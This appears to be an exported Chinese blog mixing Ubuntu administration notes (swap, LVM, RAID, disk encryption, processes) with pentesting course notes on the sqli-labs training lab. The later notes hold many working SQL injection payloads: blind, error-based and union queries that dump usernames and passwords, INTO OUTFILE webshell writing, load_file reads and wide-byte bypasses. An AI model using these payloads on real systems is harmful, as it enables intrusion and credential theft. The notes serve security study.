xxd /swapfile #格式成swap文件 (记下 UUID)sudo mkswap /swapfile #把权限调小sudo chmod 0600 /swapfile #修改挂载文件sudo vim /etv/fstab/ /swapfile none swap sw 0 0 #关闭原来的swapsudo swapoff -a #开启sudo swapon -a Swap分区1.新增加一块硬盘（如果vox提示已经创建过了，打开目录，删除那个硬盘[不要误删主硬盘和快照]，和.pre文件； 编辑.vobx文件，把新增硬盘配置项删掉） ls /dev/sd* 分区fdisk /dev/sdb 3.新建主分区，t修改分区表类型为swap分区的格式 82，w保存退出 (L 列出所有支持的分区类型)可以看到：/dev/sdb已经分出了/dev/sdb1 格式化为swapsudo mkswap /dev/sdb1 5修改挂载文件sudo vim /etv/fstab/ UUID=xxxxxx none swap sw 0 0 6.关闭原来的swapsudo swapoff -a #7.重新开启sudo swapon -a 原有的swap就可以删除啦～～～ LVM管理 一项值得感谢的技术 无须重启计算机灵活调整硬盘空间大小 硬盘分区太大浪费，太小无法满足业务发展需要 将传统的硬盘分区逻辑的组合为资源池，按需分配 概念 Volumn Groups （卷组）（池化）： 把物理资源的变成逻辑的 Physical Volumns (物理卷) Logical Volumnes （基本分区、RAID）： 可以存储数据的逻辑的概念，VG一部分资源的分割 安装包 sudo apt install lvm2 添加硬盘， 先创建PV, 再创建VG, 再创建LV 1.物理卷：123456# 创建物理卷sudo pvcreate /dev/sdb# 查看物理卷sudo pvdisplay# 查看简略的摘要信息sudo pvs 2.卷组：123456789sudo vgvreate vg01 /dev/sdb# 可以一次性指定多个pvsudo vgextend vg01 /dev/sdc /dev/sdd# 查看概要信息vgscan / vgssudo vgs 3.逻辑卷12345678910111213141516171819202122232425# 创建逻辑卷， -n 名称, -L 大小， 从哪个vg里面分割的sudo lvcreate -n lv-database -L 1G vg01 # 查看简要信息 sudo lvdisplay sudo lvscan / lvs# 格式化，(fstab自动)挂载sudo mkfs.ext4 /dev/vg01/lv-database sudo mount /dev/vg01/lv-database/ /mnt/lv-01 df -h# 灵活拓展的特性sudo lvextend /dev/vg01/lv-01 -l 256 # 增加完毕后大大小 256sudo lvextend /dev/vg01/lv-01 -l +256 # 带加号，又增加大小 256个块sudo lvextend /dev/vg01/lv-01 -L +2G # 增加2G# VG FREE 谁的百分比sudo lvextend /dev/vg01/lv-01 -l 50%VG # 拓展到vg的50%sudo lvextend /dev/vg01/lv-01 -l +50%VG # 再拓展vg的50%# 逻辑卷扩充了df -h # 是文件系统的查看。 这之后还没有告诉文件系统# 把逻辑卷的扩充告诉文件系统，就可以用啦sudo resize2fs /dev/vg01/lv-01 逻辑卷缩小1234567umount /dev/vg01/lv-01 # 必须下线e2fsck -f /dev/vg01/lv-01 # 检查文件系统resize2fs /dev/vg01/lv-01 1G # 缩小文件系统lvresize /dev/vg01/lv-01 -L 1G # 缩小逻辑卷# 重新挂载查看sudo mount /dev/vg01/lv-01 /mnt/lv-01/ 快照 故障时可回退 临时可回退机制，不可视为备份 (备份应该是异地备份) 本地保存，安全性无法保证 系统根目录使用快照可以用于测试补丁更新 测试完成合并并删除快照 创建快照等同创建一个新的LV（默认是空的） 初始不占空间，但文件发生修改时原块数据被拷贝 回退时将快照中原始数据覆盖当前快照已经被修改的 1234567891011121314# 快照 -s 是快照lv， -L大小sudo lvcreate -s -n s01 -L 2G vg01/lv-01# 快照LV可以被直接挂在，用于恢复单个文件# 恢复快照（恢复后快照被删除） --mergr 哪个快照sudo lvconvet --merge vg01/s01# 直接是不能恢复的，我们查看一下sudo lvscan # 让他不是active才行sudo umount /mnt/lv-01 # 退出当前目录，执行此命令卸载目录sudo lvchange -an vg01/lv-01 # -n 让他不activesudo lvchange -ay vg01/lv-01 # -y 让他activesudo mount dev/vg01/lv-01 /mnt/lv-01 # 重新挂载 移动物理卷数据当磁盘性能或老旧等因素需要更换硬盘，提前转移数据# 后门是目标盘，前面 -n 是指定lv数据, -i 数值，每隔几秒显示一下运行状态sudo promove -n lv-01 /dev/sdb /dev/sdc -i 1sudo pvdislpay 从业务的角度来思考技术，不要做书呆子技术人员 RAID 高级管理 与LVM结合将达到完美 软RAID基于mdadm驱动实现软RAID并不比硬RAID差12345678910sudo apt install mdadmsudo mdadm -C -v /dev/md0 -l1 -n2 /dev/sdb /dev/sdc -z100M -x1 /dev/sdd-C 创建-v 详细信息-l RAID类型（0，1，5，6，10）-n RAID盘数量-z 从每个硬盘占用多少空间创建RAID-x Spare盘（备用盘）数量+盘名# 约定俗成： 逻辑设备：以0结尾，物理设备以1结尾 常用管理命令： 查看raid盘的状况： cat /proc/mdstat （开机之后临时生成的）-r 删除物理硬盘（如果正常状态下是提示busy的， 可以-f设置失效, –re-add重新加入磁盘阵列）-A 手动出发数据同步 替换硬盘后安装Grub(系统启动盘)sudo grub-install /dev/md0 格式化和加载sudo mkfs.ext4 /dev/md0 链接 符号链接(软链接) 和 硬链接 ls -li （查看inode值） inode: 存放文件元数据的数据对象，表现为一个数值编号 创建硬链接（inode值是相同的， 给不同数据起了不同的名） ln fileS fileD ln log2013.log ln2013 目录不能创建硬链接 不能移动硬链接到不同分区（inode改变） 创建软链接 不共用inode ln -s fileS fileD （可以跨设备，可以给目录… , 相对路径和绝对路径， 建议源文件是绝对路径，目标链接是相对路径） 数据加密/磁盘加密 数据最值钱 清除所有数据：12# 把磁盘所有字节数据全覆盖为0sudo dd if=/dev/zero of=/dev/sdc 磁盘加密：123456789101112131415# 安装软件包sudo apt install cryptsetup # 加密分区（需提前分区 fdisk） （boot/引导分区是不能加密的）sudo cryptsetup luksFormat /dev/sdc1# 打开加密分区（随意命名）sudo cryptsetup luksOpen /dev/sdc1 srypt1# 格式化加密分区sudo mkfs.ext4 /dev/mapper/crypt1# 挂载在加密分区sudo mount /dev/mapper/crypt1 /mnt/crypt1# 更改所有者sudo chown xps:xps /mnt/crypt1# 关闭加密分区(先umount)sudo umount /mnt/crypt1sudo cryptsetup:luksClose crypt1 不仅对硬盘有用， 也可以对U盘进行加密可以用cryptsetup对u盘加密，设置一个足够强度的密码， 也可以再格式化为ext4格式，让win用户不能直接打开]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-进程管理&打包压缩]]></title>
    <url>%2Fubuntu%20server-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%26%E6%89%93%E5%8C%85%E5%8E%8B%E7%BC%A9%2F</url>
    <content type="text"><![CDATA[进程管理ps1234567891011121314151617181920212223242526272829信息：PID： 进程idTTY: 运行进程的终端设备STAT： 进程状态(Sleep, Running)TIME： 该进程占用的cpu时间COMMAND: 命令名称参数：-x： 当前用户启动的所有进程-ax： 所有用户启动的进程-u： 进程详细信息-aux:-w： 显示进程文件完整路径-auxw:ps u PID ($$: 当前shell的进程id)ps -L pid号 # 查看当前进程下面的线程ps fajx # 查看进程树pstree # 更直观的进程树# 结束进程kill pid # 默认Termkill -STOP pid # 暂停进程 （杀病毒杀不掉的时候可以先stop）kill -CONT pid # 回复已暂停的进程kill -KILL pid # kill -9 pidkill -l # 所有kill命令的信号 归档打包和压缩gzip (GUN Zip)1234567gzip file1gunzip file1.gz# Gzip不支持多文件/目录的归档打包# 会干掉原始文件 tar打包归档 (Archive)123456789101112131415tar cvf file2.tar file1 file2 file3 # 并不进行压缩gzip file.tar # 可以打包之后再压缩gunzip file.tar.gz # 先解压tar xcvf file2.tar # 解包# tar 结合gztar zcvf file2.tar.gz file1 file2 file3 # 参数z 打包同事亚索tar -ztvf file.tar.gz # -t 显示文件内容但是不解压tar jcvf c.tar.bz2 a b # bz2 bzip2速度可能慢一点，但是对文本文件压缩更小1234567bzip2 f # 压缩nunzip f.bz2# tar 的 -j也可以tar jcvf c.tar.bz2 a b sudoersudo用户组 cat /etc/group中sudo组，才能加sudo运行命令 处于安全的考虑 sudo visudo 文件/etc/sudoers 12345678910组 所有主机=() 系统的哪些命令 %sudo All=(ALL:ALL) ALL# 指定配置user_alias ADMINS = user1, user2 # 指定一些用户的别名ADMINS ALL = (ALL)NOPASSWD:ALL # 该别名的权限root ALL=(ALL) ALL]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-帮助&输出与重定向]]></title>
    <url>%2Fubuntu%20server-%E8%BE%93%E5%87%BA%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91%2F</url>
    <content type="text"><![CDATA[获取帮助man123456789101112131415man cmdman -k keyword #搜索关键词（不知道具体命令）man -k 'list directory contents' # 多个关键字# 每个命令的 手册页 可以使用数字编号引用片段（section）man 5 passwd #（ 按section查看）- 1： 用户命令- 2： 系统调用- 3： 高级Unix编程库文档（程序员常用）- 4： 设备借口和驱动信息（很少使用）- 5： 文件描述（系统配置文件）- 6： Games- 7： 文件格式，惯例，编码(ASCII等)- 8： 系统命令和服务器 infoGUN不太喜欢慢，因此开发了info有时候优于man，有时不是info ls /usr/share/doc # 部分软件包没有列入man或者info的文档 cmd –help / -h绝大部分的不成文规定，并不都是，比如ls -h Shell输入与输出输出重定向1234567891011ls a/ &gt; file # 会覆盖ls a &gt;&gt; file # 追加head /proc/cpuinfo head &lt; /proc/cpuinfo # 输入重定向#`set -C` 之后不得覆盖 管道123head /proc/cpuinfo | tar a-z A-Zifconfig | grep inet | awk'&#123;print $2&#125;' | awk -F. '&#123;print $2&#125;' # -F 指定分隔符，这里以.分割 标准错误 stderr(报错包含重要信息)12345678# 写脚本的时候有用，可以把错误信息报错到某个文件ls /abc 2&gt;e # 2:标准错误 1:标准输出 0:标准输入ls 0&lt; a/ls 1&gt; file1ls b 2&gt; err1ls a/ &gt; f1 2&gt;&amp;1 # 标准输出、标准错误都输出到文件f1 （&amp;1代表标准输出） 常见报错信息]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[07-mysql盲注]]></title>
    <url>%2F07-mysql%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[SQL测试-基于 布尔,延时 盲注 场景：无回显，并且没有报错和其他显示能用布尔就不用延迟 几个相关函数：regexp regexp ‘^xiaodi[a-z]’ 匹配xiaodi及xiaodi…等if if(条件,5,0) 条件成立 返回5 反之 返回0sleep sleep(5) SQL语句延时执行5秒mid mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位substr substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度left left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位length length(database())=8，判断数据库database()名的长度ord=ascii ascii(x)=101，判断x的ascii码是否等于101，即email中的字母eIFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。CAST()和CONVERT()函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：CAST(value as type); CONVERT(value, type); 基于布尔(逻辑)盲注Less-5用burp批量跑0x01 获取数据库名操作Payload： left()获取数据库名长度值?id=1&#39; and length(database())=8 %23 获取数据库名第一位值?id=1&#39; and left(database(),1)=&#39;s&#39; %23 等于?id=1&#39; and left(database(),1)&gt;&#39;a&#39; %23 大于 获取数据库名第二位值?id=1&#39; and left(database(),2) &gt; &#39;sa&#39; %23?id=1&#39; and left(database(),2) = &#39;se&#39; %23 0x02 获取表名操作Payload： ascii(substr())获取表名第一个第一位的值（下面这个是获取表名中第一个表，的第二位的值）?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23获取表名第一个第二位的值?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=101 %23获取表名第二个第一位的值?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101 %23 用burp批量跑(最后一种模式，设置两个变量 limit $0, 1), $1,1))=115) 0x03 获取列名操作Payload： regxp获取列名regexp 查询users表第一个列名是否有us…列名?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)--+ 0x04 获取数据操作Payload： ord(mid())获取数据 security.users表中username列名的第一个第一位?id=1&#39; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+(获取username中的第一行的第一个字符的ascii，与68进行比较) 基于延时盲注0x01 获取数据库名操作Payload： if(条件，成立返回值，不成立的返回值)获取数据库名第一个第一位?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+可以把sleep放外面：and sleep(if ‘x’=’yx, 5, 0) 0x02 获取表名操作Payload：获取列名第一个第一位?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),1)--+ 后续参考：https://www.cnblogs.com/xishaonian/p/6113965.html SQL二次注入测试案例测试：less-24 及实际举例25-30关卡好多是二次注入 自己练习 应用范围：我们注册一个用户后，然后进入用户中心，对应的url地址： xxx.php?user=xiaodi如果把注册的用户名改为: xx&#39; union select 1,2,3 --总之: 将注入语句让web写入到数据库中，web在调用数据库中数据查询时，就触发了… 原理 mybatis以及预编译如何防止SQL注入 参考：https://www.cnblogs.com/haojun/p/10682407.html https://www.cnblogs.com/yangzailu/p/11381765.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[06-mysql类型报错注入]]></title>
    <url>%2F06-mysql%E7%B1%BB%E5%9E%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1. SQL各种参数类型下的注入测试 数字型-sqlilabs less2 x.php?id=1 字符型-sqlilabs less1 x.php?id=xiaodi 搜索型-自写测试 x.php?q=1 （select * from table where name like ‘%xi%’） 搞懂： 搞清楚为何要区分上面的类型数字的不带引号，字符型带符号，注意考虑干扰搜索型：模糊搜索计算机中搜索的通配符为*数据库中搜索的通配符为% 2. SQL各种报错方式下的注入测试 此类报错注入旨在解决无回显下的注入测试注：MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数 参考资料：https://www.wandouip.com/t5i158282/http://blog.sina.com.cn/s/blog_1450cc4c60102vraq.html floor报错sqlilabs less5 报错注入有长度限制，所以concat有时候不行， 需要limit 或者还需要subpayload: 123456789-- burp中注意空格问题（空格可以用+加号， 或者%20, 或者 /**/ 代替）?id=1&apos;+and+(select+1+from (select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+?id=-1&apos; and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- + ?id=1&apos; and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2)))-- + http://192.168.0.121:8080/Less-5/?id=1%27 and (select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))) -- + -- 可以用burp批量跑 limit 0,1 的0这里。payload设置数字范围 updatexml报错sqlilabs less5updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数payload: 123456?id=1&apos; and 1=(updatexml(1,concat(0x3a,(select version())),1))--+?id=1&apos; and 1=(updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1))--+http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e), 1) -- + http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select concat_ws(0x3a, username,password) from security.users limit 0,1),0x7e), 1) -- + extractvalue报错sqlilabs less5extractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数payload: 12id=1&apos; and extractvalue(1,concat(0x7e,user()))--+?id=1&apos; and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1)))--+ 3.SQL各种查询方式下的注入测试 select insert（注册，用户添加，发布文章） Less-18 12345678910$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;-- sql语句 ??? 对吗没验证，截图了insert into users(username, passwd) values(&apos;x&apos; or updatexml(1,concat(0x3a,( version() ),1) or &apos; &apos;, &apos;psd&apos;);--payloadUser-Agent: 中 x&apos; or updatexml(1,concat(0x7e,(version())),1) or &apos; User-Agent: x&apos; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1)),1) or &apos; 自己练习增,删,改： updatexml和extra两个都实验 delete（后台删除文章, 用户…） update （改密码，数据同步）通过以上查询方式与网站一个用的关系，可以由注入点产生的地方或者应用猜测到对方的SQL查询方式 环境搭建 自己搭建 利用上述报错注入语句进行查询模式注入测试 123456789101112create database newdb;use newdb;create table users ( id int(3) not null auto_increment, username varchar(20) not null, passowrd varchar(20) not null, primary key(id));insert into users values(1,&apos;janes&apos;,&apos;Eyre&apos;); 注意使用场景，在什么情况下用到 插件：mysql监控-Seay代码审计系统 查看执行了哪些语句 报错注入有长度限制:32位, 如果长度超出会显示不全.解决方案: substr((),1,1) 递进截取依次 (select substr(concat(username,0x3a,password), 1,10) from users limit 0,1) 三种查询方式对应的报错注入测试floor报错演示Payload 123456insert into users(id,username,passowrd) values(1,'Olivia' or (select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x;) or '','Nervo');update users set passowrd='Nicky' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '' where id=2;delete from users where id=1 or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) updatexml报错演示Payload 12345insert into users(id,username,passowrd) values(2,&apos;Olivia&apos; or updatexml(1,concat(0x7e,(version())),0) or &apos;&apos;,&apos;Nervo&apos;);update user set passowrd=&apos;Nicky&apos; or updatexml(1,concat(0x7e,(version())),0) or &apos;&apos; where id=2 and username=&apos;Nervo&apos;;delete from users where id=2 or updatexml(1,concat(0x7e,(version())),0) or &apos;&apos;; extractvalue报错演示Payload 12345insert into users(id,username,password) values(2,'Olivia' or extractvalue(1,concat(0x7e,database())) or '','Nervo');update users set passowrd='Nicky' or extractvalue(1,concat(0x7e,database())) or '';delete from users where id=1 or extractvalue(1,concat(0x7e,database())) or ''; 参考：https://www.cnblogs.com/babers/articles/7252401.html Notes: delete，insert，update语句存在sql注入，扫描工具常规扫描不能获取到（没有权限，前提要登录状态下/登录后按钮的点击事件工具里面不能自动点击）， 所以：只能手工注入 比如场景： 注册/会员中心/删除文章/更新编辑文章 –&gt;抓包：数据包地址+id参数 ： 手工测试]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[05-mysql提交方式注入]]></title>
    <url>%2F05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[常见提交方式下的注入漏洞 前言：WEB应用在数据传递接受中，针对SQL注入安全漏洞，由于数据大小，格式等原因，脚本在接受传递时会有多种传递方式，传递方式的不同将影响到安全测试的不同！本课将针对此类问题进行逐一讲解。 第一点：数据常见提交方式https://www.cnblogs.com/weibanggang/p/9454581.html 第二点：产生注入的接受方式例子：GETPOST：COOKIE ：REQUEST ： $_REQUEST() 何种方法都可以接参数SERVER： http头部注入。$_SERVER https://www.cnblogs.com/jianmingyuan/p/5900064.html等 第三点：实战测试案例-sqlilabs关卡post登陆框注入-sqlilabs less13涉及知识点: 万能密码 Less-13 无回显Less-11 有回显 123456789101112131415161718-- 一般是没有括号的，先手工，再工具试试有没有其他符号干扰-- 可以用hackbar等进行post参数注入-- 方法1')or 1=1 -- + -- 然后开始按照步骤开始利用 （盲猜 order by 3, 库名，表，列，数据）admin') union select null,database()#-- 这里面没回显数据的 地方，想办法让他报错/工具跑-- sqlmap post参数是 --data ""-- 下面的没成功， 可以再试试admin') union select count(*), concat(select database()) as admin from information_schema.tables group by admin\-- 报错注入admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))#+加号类似空格 http头部注入-sqlilabs less18$_SERVER() 比如站长之家获取我的浏览器的数据，其中http头部可以修改（你懂得） 12 cookie修改注入-sqlilabs less20无回显 12-- 大概是这样User-Agent: admin' or updatexml(1,concat(0x7e,database(),0x7e),0) or ']]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[04-mysql注入]]></title>
    <url>%2F04-mysql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[靶场下载地址：https://github.com/Audi-1/sqli-labs mysql数据库分层1.库名，表名，列名，数据库用户等 2.数据库与WEB应用相结合的架构关系 123456789101112131415Mysql数据库 数据库A zblog = www.zblog.com 表名 列名 数据 数据库B dede = www.dede.com 表名 列名 数据PS：数据库A及B都属于Mysql数据库里面的数据库用户：管理数据库的用户级别：管理员用户root 普通用户随机自带数据库：mysql数据库自带的 mysql注入权限问题 普通用户 （只能靠猜数据进行安全测试） root用户 查询参数： 1234user()database()version() // 查询数据库版本@@version_compile_os // 操作系统版本 跨库注入 场景: 要渗透B， B没有漏洞，但是A有注入漏洞 1234567891011121314151617-- 1.获取所有的数据库name -- select group_concat(schema_name) from information_schema.schemata;http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata)2. 再选取某个数据库下面的表 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')3. 根据表查列http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')4. 查数据http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from security.users)-- 或者http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 3,1)-- 或者http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from security.users) sqlLabs 1 -7 练习 MYSQL高权限注入mysql跨库注入-已讲 mysql文件操作注入-sqlilabs less7 12345678910111213141516171819202122-- nullhttp://192.168.0.106/Less-7/?id=1')) union select null,null,null --+--win的路径的话，加2个斜杠防止转义-- 写入（aaa可以换成后门代码,txt可以换php） （高版本，失败：需要数据库开启secure_file_priv，如果可以执行命令，可以绕过：下来自己查）http://192.168.0.106/Less-7/?id=1')) union select 'aaa',null,null into outfile '/var/www/html/Less-7/test.txt' --+-- 自己查资料？？？？？？？？？？-- 读取文件http://192.168.0.106/Less-7/?id=1')) union select null,null,load_file('/var/www/html/Less-7/test.txt') --+-- 路径问题：需要提前得到网站完整路径-- 路径获取方法：1.报错显示 inurl:php warning2.遗留文件 phpinfo()的 server_root。 script_filename3.漏洞爆路径 discuzz爆路径4.其他 读取(配合load_file)网站解析配置文件 字典盲猜测fuz： MYSQL过滤型注入mysql宽字节绕过注入-sqlilabs less32 宽字节注入条件：数据库编码为GBK等非中文 原理：%5c是反斜杠/ , 而 %df%5c 是一个繁体字（我不会读），所以单引号成功逃逸 12345678910111213141516171819202122$id=check_addslashes($_GET['id']); # 在你输入单引号的时候，自动加\转义魔术引号： magic_quote_gpc (php.ini配置文件中), 打开之后，会转义单引号双引号 ------ 和上面的过滤函数有区别【方法】：%df"%df'http://192.168.0.106/Less-32/?id=-1%df%27 union select 1,2,3 -- + 其他方法，自己查阅：？？？？？？？？？？列举几个常用的URL转码的字符空格 %20单引号 %27# %23\ %5C 在PHP中，通过iconv()进行编码转换时，也可能存在宽字节注入漏洞 MYSQL其他注入加密编码注入 -sqlilabs less21 (post注入)先加密，再填写inurl:MQ= 1了解主流加密/编码规律 base64注入攻击程序代码中使用base64_decode($_GET(&#39;id&#39;)) 对参数进行解码 12345对 id&apos; 进行base64编码后为 MSc= ，而%3d是=的url编码， 拼接为 `MCs=%3d` 后尝试；1 and 1=1 的base64编码为 ，1 and 1=2 的base64编码为 ， 分别放到id=的后门尝试， 结果如果不同，则存在漏洞继续使用order by 继续` 其他利用场景：过waf， 绕过检测 堆叠查询注入堆叠查询可以执行多条sql语句，多语句之间使用分号隔开，在第二个sql语句中构造自己要执行的语句 例如： 1234';select if(substr(user(),1,1)='r', sleep(5),1) -- + -- 一般只会返回第一条sql的执行结果http://192.168.0.121:8080/Less-9/?id=1%27; select if(left(user(),4)='root',sleep(5), 0); -- + -- 所以，在第二条语句中，可以私用update更新数据或者时间盲注获取数据 XFF注入x-Forwarded-For， 代表客户端真实的ip， 修改后可以伪造客户端ip将xff头改为:127.0.0.1访问，如果返回正常，分别设置为127.0.0.1&#39; and 1=1# 和127.0.0.1&#39; and 1=2#再次访问 ，根据返回结构判断有没有漏洞继续使用order by， 而后使用union 127.0.0.1&#39; union select 1,2,3# php中的getenv()函数用于获取一个环境变量的值 ，如果不存在返回false 下次课继续…]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[03-漏洞发现]]></title>
    <url>%2F03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[基于WEB应用扫描测试被动式扫描 x-ray （长亭科技开发的） https://xray.cool/xray/#/tutorial/introduce Github: https://github.com/chaitin/xray/releases （国外速度快）网盘: https://yunpan.360.cn/surl_y3Gu6cugi8u （国内速度快） 主动式扫描 ：工具： awvs（可以录制填写账号密码）、 netsparker、 appscan(特别占用电脑资源) 注意验证后扫描 无验证码：模拟登陆 比如 awvs（可以录制填写账号密码） 有验证码：带入cookie 比如 awvs（桌面版：扫描option-&gt;cookie。网页版：custom cookie, 把网页数据包赋值过来） 抓app数据包的差异导致问题：awvs(custome header的添加；旧版：header and cookie) 基于操作系统扫描测试Nessus Openvas Goby 基于NMAP使用扫描测试https://blog.csdn.net/qq_29277155/article/details/50977143 其他安全漏洞扫描补充未授权访问 中间件安全 逻辑越权问题 更多安全扫描见：https://www.uedbox.com/tools/type/scanner/ 注意：部分漏洞（越权）利用工具无法探针，只能手工]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[02-漏洞分类]]></title>
    <url>%2F02-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[1.了解有那些漏洞名称？sql注入，文件上传，xss跨站，代码执行，命令执行，任意下载，目录遍历，文件泄漏，文件包含，逻辑越权，缓冲区溢出等 2.了解漏洞的产生层面？web应用，系统层面，第三方软件（数据库,中间件） 告诉大家一个道理： 在web应用或app等其他应用提供服务的同时，其中提供服务的所有对象（如搭建平台，数据库，网站程序，服务器操作系统，用到第三方管理软件等）均存在漏洞的可能性。 3.了解漏洞的影响范围？如：注入 有的可以进行文件操作 有的只能获取数据 上传 直接通过上传漏洞成功上传控制后门 告诉大家一个道理： 在做安全测试的时候，测试的目的是否可以根据当前发现的漏洞实现（每个漏洞能造成的危害都不一样，有大有小。） 4.了解目前主流的漏洞？5.了解漏洞的发现挖掘？黑盒测试：没源码 其他情况不知道的测试白盒测试：代码审计 源码挖掘漏洞 FUZZ 软件测试 工具： Awvs：web应用一块的 Nmap：全能型的 细分不够 Appscan: web应用一块的 nessus：操作系统一块的-第三方软件：通过 【端口】 或【 服务 】探针到使用到某些第三方软件，如weblogic或hfs，可以再通过【 漏洞平台 】或 【搜索引擎】 寻找指定漏洞。exploit-db， seebug等 一些web工具： https://www.uedbox.com/tools/type/webapp/ 6.了解漏洞的利用形式？手工操作 工具或脚本实现 编译利用代码实现（二次开发） 漏洞发现问题：1.登录]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[01-信息搜集]]></title>
    <url>%2F01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[一些web工具： https://www.uedbox.com/tools/type/webapp 1.收集域名信息Whois查询在线工具： 爱站网 站长之家 VirusTotal 备案信息查询 ICP备案查询网 天眼查 2.收集敏感信息Google hacking常用语法：site:inurl:intext:filetype:intitle:link:info:cache: 缓存 比如：site:edu.cn intext:后台管理 还可以用它来搜集 后台，数据库文件，SQL注入，配置信息，源代码泄露，未授权访问，robots.txt等敏感信息 百度，必应，Yandex, 雅虎，Shodan等类似 3.收集子域名信息子域名检测工具工具： Layer子域名挖掘机 (推荐) K8 wydomain Sublist3r (推荐， 能列出多种资源) dnsmaper subDomainsBrute (推荐，python开发的， 可以使用小字典递归地发现三四五级域名) Maltego CE …… 搜索引擎枚举比如：搜索百度下面的子域名site:baidu.com 第三方聚合应用枚举很多第三方服务汇聚了大量DNS数据集， 可以通过他们检索某个给定域名的子域名 工具： DNSdumpster 网站 在线DNS侦查和搜索的工具来挖掘制定域潜藏的大量子域 证书透明度(CT)公开日志枚举是证书授权机构(CA)的一个项目， CA会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名、邮件地址 … … 方法：最简单的就是： 使用搜索引擎搜索一些公开的CT日志推荐： crt.sh: https://crt.sh 网站 https://censys.io 网站 其他工具：一些在线网站 子域名爆破网站： https://phpinfo.me/domain IP反查绑定域名网站： 